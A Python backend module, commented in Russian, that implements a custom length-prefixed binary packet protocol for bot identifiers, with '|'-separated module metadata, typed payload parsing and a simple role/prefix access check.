# backend/Services/network.py

import json
import asyncio
from typing import Any, Dict, Optional, Tuple, Union
import backend.LoggerWrapper as logger

class NetworkProtocol:
    """
    Статический класс для реализации универсального протокола V8.0.
    Схема заголовка (8 байт): [id_len: 1b] [mod_len: 2b] [pay_len: 5b] (BigEndian)
    Схема данных: Header + Identifier + ModuleBody + Payload
    ModuleBody сегментируется через '|'
    """

    @staticmethod
    def has_access(user_data: Dict[str, Any], target_identifier: str) -> bool:
        """
        Проверка прав доступа пользователя к конкретному идентификатору бота.
        """
        if not user_data:
            return False

        user_role: str = user_data.get("role", "user")
        user_prefix: str = str(user_data.get("prefix", "NONE"))
        
        # Очистка ID от возможных нулевых байтов
        clean_id: str = target_identifier.strip('\x00').strip()

        return user_role == "admin" or user_prefix == "ALL" or clean_id.startswith(user_prefix)

    @staticmethod
    async def read_packet(reader: asyncio.StreamReader) -> Tuple[Optional[str], Optional[Dict[str, str]], Any]:
        """
        КЛАССИЧЕСКИЙ МЕТОД (используется в Auth и простых модулях).
        Читает заголовок и возвращает только распарсенные данные.
        """
        try:
            _, bot_id, meta, payload = await NetworkProtocol.read_packet_full(reader)
            return bot_id, meta, payload
        except Exception:
            return None, None, None

    @staticmethod
    async def read_packet_full(reader: asyncio.StreamReader) -> Tuple[bytes, Optional[str], Optional[Dict[str, str]], Any]:
        """
        ОПТИМИЗИРОВАННЫЙ МЕТОД (для ClientConnection).
        Возвращает (весь_пакет_байтами, bot_id, metadata, payload).
        """
        try:
            # 1. Читаем заголовок
            header_bytes: bytes = await reader.readexactly(8)

            id_len: int = header_bytes[0]
            mod_len: int = int.from_bytes(header_bytes[1:3], "big")
            pay_len: int = int.from_bytes(header_bytes[3:8], "big")

            # 2. Читаем тело на основе длин из заголовка
            total_body_length: int = id_len + mod_len + pay_len
            body_content: bytes = await reader.readexactly(total_body_length)
            
            # Сохраняем полный пакет для транзита (proxy-mode)
            full_raw_packet = header_bytes + body_content

            # 3. Сегментация данных
            bot_identifier: str = body_content[:id_len].decode(errors="ignore").strip('\x00').strip()
            module_raw_string: str = body_content[id_len : id_len + mod_len].decode(errors="ignore")
            payload_raw_bytes: bytes = body_content[id_len + mod_len:]

            # 4. Парсинг метаданных модуля (ИСПОЛЬЗУЕМ '|')
            segments: list = module_raw_string.split("|")
            metadata_dictionary: Dict[str, str] = {
                "module": segments[0] if len(segments) > 0 else "Unknown",
                "type": segments[1] if len(segments) > 1 else "bin",
                "action": segments[2] if len(segments) > 2 else "None",
                "extra": segments[3] if len(segments) > 3 else "None"
            }

            # 5. Десериализация Payload
            parsed_payload = payload_raw_bytes
            p_type = metadata_dictionary["type"]
            
            if p_type == "json":
                parsed_payload = json.loads(payload_raw_bytes.decode("utf-8"))
            elif p_type == "str":
                parsed_payload = payload_raw_bytes.decode("utf-8", errors="ignore")
            elif p_type == "int":
                parsed_payload = int.from_bytes(payload_raw_bytes, "big")

            return full_raw_packet, bot_identifier, metadata_dictionary, parsed_payload

        except (asyncio.IncompleteReadError, ConnectionError):
            return b"", None, None, None
        except Exception as runtime_error:
            logger.Log.error(f"[NetworkProtocol] Read Error: {runtime_error}")
            return b"", None, None, None

    @staticmethod
    def pack_packet(bot_identifier: str, module_name: str, data_type: str, action: str, extra: str, payload: Any) -> bytes:
        """
        Упаковка данных в пакет V8.0 для отправки.
        """
        try:
            payload_bytes: bytes = b""

            # Сериализация полезной нагрузки
            if data_type == "bin" and isinstance(payload, bytes):
                payload_bytes = payload
            elif data_type == "json":
                payload_bytes = json.dumps(payload, separators=(',', ':')).encode()
            elif data_type == "str":
                payload_bytes = str(payload).encode()
            elif data_type == "int" and isinstance(payload, int):
                payload_bytes = payload.to_bytes(4, "big")
            else:
                # Fallback для неопознанных бинарных данных
                payload_bytes = payload if isinstance(payload, (bytes, bytearray)) else b""

            identifier_bytes: bytes = bot_identifier.encode()
            
            # Сборка MOD_BODY с разделителем '|'
            module_body_string: str = f"{module_name}|{data_type}|{action}|{extra}"
            module_body_bytes: bytes = module_body_string.encode()

            # Сборка заголовка (1 + 2 + 5 = 8 байт)
            header_bytes: bytes = (
                len(identifier_bytes).to_bytes(1, "big") +
                len(module_body_bytes).to_bytes(2, "big") +
                len(payload_bytes).to_bytes(5, "big")
            )

            return header_bytes + identifier_bytes + module_body_bytes + payload_bytes
            
        except Exception as packing_error:
            logger.Log.error(f"[NetworkProtocol] Packing Error: {packing_error}")
            return b""